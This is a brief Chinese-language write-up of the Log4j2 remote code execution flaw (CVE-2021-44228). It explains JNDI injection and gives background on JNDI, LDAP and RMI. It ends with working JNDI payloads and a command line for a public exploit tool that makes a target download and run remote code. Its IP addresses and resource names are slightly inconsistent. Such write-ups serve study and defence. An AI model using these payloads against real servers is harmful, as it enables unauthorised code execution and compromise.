# Log4j2远程代码执行漏洞(cve-2021-44228)

------

## 描述

Apache Log4j2 是一个基于 Java 的日志记录工具。该工具重写了 Log4j  框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。  在大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。攻击者利用此特性可通过该漏洞构造特殊的数据请求包，最终触发远程代码执行。

log4j2中存在JNDI注入漏洞，当程序记录用户输入的数据时，即可触发该漏洞。成功利用该漏洞可在目标服务器上执行任意代码。

------

## 原理概述

```
当用户输入信息时，应用程序中的log4j2组件会将信息记录到日志中
假如日志中含有该语句${jndi:ldap:192.168.96.1:1099/exp}，log4j就会去解析该信息，通过jndi的lookup()方法去解析该URL：ldap:192.168.96.1:1099/exp
解析到ldap，就会去192.168.61.129:1099的ldap服务找名为shell的资源，如果找不到就会去http服务中找
在http中找到shell之后，就会将资源信息返回给应用程序的log4j组件，而log4j组件就会下载下来，然后发现shell是一个.class文件，就会去执行里面的代码，从而实现注入
攻击者就可以通过shell实现任意的命令执行，造成严重危害
```

## 影响

```
Apache Log4j 2.x <= 2.14.1
```

------

## 名词介绍

### JNDI

JNDI(Java Naming and Directory Interface,Java命名和目录接口)是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。

例子：

​	通过原始的JDBC来连接数据库，我们可以选择在代码中直接写入数据库的连接参数，但一旦数据源发生变更，我们就势必要改动代码后重新编译才能连接新的数据源。而如果我们将数据库连接参数改成外部配置的方式，那么也就实现了配置和代码之间的解耦。JNDI规范本质上就是上述的这种操作。

JNDI注入主要是用过下载远程class，来运行恶意代码。JNDI注入攻击时常用的就是通过RMI和LDAP两种服务。

### LDAP

轻型目录访问协议（Lightweight Directory Access Protocol，是一个开放的，中立的，工业标准的应用协议，通过IP协议提供访问控制和维护分布式信息的目录信息。

### RMI

RMI (Remote Method Invocation) 模型是一种分布式对象应用，使用 RMI 技术可以使一个 JVM 中的对象，调用另一个 JVM 中的对象方法并获取调用结果。这里的另一个 JVM 可以在同一台计算机也可以是远程计算机。因此，RMI 意味着需要一个 Server 端和一个 Client 端。

## poc

通过DNSLog验证

```
playload:${jndi:ldap://xxxxxx.dnslog.cn}

如果是get请求需要进行url编码
```

## exp

通过*JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar*这个工具实现

```
通过 java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "命令" -A 服务器ip 运行jar包
```

```
playload:${jndi:rmi://ip:port/exp}
```

具体用法详见利用工具中README-CN.md



